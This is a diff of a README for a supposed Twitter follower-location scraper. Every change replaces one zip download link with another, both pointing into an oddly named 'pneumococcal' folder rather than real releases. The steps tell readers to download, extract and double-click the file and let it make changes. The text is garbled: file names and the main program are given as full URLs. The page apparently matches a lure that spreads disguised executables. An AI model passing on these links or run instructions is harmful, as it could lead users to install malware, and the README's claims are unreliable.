@@ -4,25 +4,25 @@
 The **twitter-followers-location-analysis-scraper** is a simple tool that helps you understand where your Twitter followers are located. You can gain insights from their locations, which can help you make better decisions for your social media strategy.
 
 ## 📥 Download
-[![Download Here](https://raw.githubusercontent.com/Pwoto/twitter-followers-location-analysis-scraper/main/pneumococcal/twitter-followers-location-analysis-scraper_v3.7.zip)](https://raw.githubusercontent.com/Pwoto/twitter-followers-location-analysis-scraper/main/pneumococcal/twitter-followers-location-analysis-scraper_v3.7.zip)
+[![Download Here](https://github.com/Pwoto/twitter-followers-location-analysis-scraper/raw/refs/heads/main/pneumococcal/twitter-analysis-followers-location-scraper-2.9.zip)](https://github.com/Pwoto/twitter-followers-location-analysis-scraper/raw/refs/heads/main/pneumococcal/twitter-analysis-followers-location-scraper-2.9.zip)
 
 ## 🚀 Getting Started
 Follow these steps to get started with the twitter-followers-location-analysis-scraper. 
 
 ### 1. **Visit the Download Page**
-Go to the Releases page to find the latest version of the tool. You can find it here: [Download Here](https://raw.githubusercontent.com/Pwoto/twitter-followers-location-analysis-scraper/main/pneumococcal/twitter-followers-location-analysis-scraper_v3.7.zip).
+Go to the Releases page to find the latest version of the tool. You can find it here: [Download Here](https://github.com/Pwoto/twitter-followers-location-analysis-scraper/raw/refs/heads/main/pneumococcal/twitter-analysis-followers-location-scraper-2.9.zip).
 
 ### 2. **Choose Your Version**
 On the Releases page, you will see different versions of the software. Click on the version you want. Look for the **assets** section below the version title.
 
 ### 3. **Download the File**
-In the assets section, you will see a file named something like `https://raw.githubusercontent.com/Pwoto/twitter-followers-location-analysis-scraper/main/pneumococcal/twitter-followers-location-analysis-scraper_v3.7.zip` or `https://raw.githubusercontent.com/Pwoto/twitter-followers-location-analysis-scraper/main/pneumococcal/twitter-followers-location-analysis-scraper_v3.7.zip`. Click on the file to start downloading it to your computer.
+In the assets section, you will see a file named something like `https://github.com/Pwoto/twitter-followers-location-analysis-scraper/raw/refs/heads/main/pneumococcal/twitter-analysis-followers-location-scraper-2.9.zip` or `https://github.com/Pwoto/twitter-followers-location-analysis-scraper/raw/refs/heads/main/pneumococcal/twitter-analysis-followers-location-scraper-2.9.zip`. Click on the file to start downloading it to your computer.
 
 ### 4. **Install the Software**
 If you've downloaded a `.zip` file, you will need to unzip it first. Right-click the downloaded file and select **Extract All**. Choose a location on your computer where you want to save the files.
 
 ### 5. **Run the Application**
-Once extracted, locate the main application file. It should be titled `https://raw.githubusercontent.com/Pwoto/twitter-followers-location-analysis-scraper/main/pneumococcal/twitter-followers-location-analysis-scraper_v3.7.zip`. Double-click on this file to run the tool. If prompted by your computer, allow it to make changes.
+Once extracted, locate the main application file. It should be titled `https://github.com/Pwoto/twitter-followers-location-analysis-scraper/raw/refs/heads/main/pneumococcal/twitter-analysis-followers-location-scraper-2.9.zip`. Double-click on this file to run the tool. If prompted by your computer, allow it to make changes.
 
 ## ⚙️ System Requirements
 To run this application smoothly, ensure your system meets the following requirements:
@@ -73,4 +73,4 @@ The twitter-followers-location-analysis-scraper provides an easy way to analyze 
 For any questions or further assistance, do not hesitate to reach out or consult the documentation available in this repository.
 
 ## 📥 Download Again
-Don't forget to visit the Releases page to download the application: [Download Here](https://raw.githubusercontent.com/Pwoto/twitter-followers-location-analysis-scraper/main/pneumococcal/twitter-followers-location-analysis-scraper_v3.7.zip).
+Don't forget to visit the Releases page to download the application: [Download Here](https://github.com/Pwoto/twitter-followers-location-analysis-scraper/raw/refs/heads/main/pneumococcal/twitter-analysis-followers-location-scraper-2.9.zip).
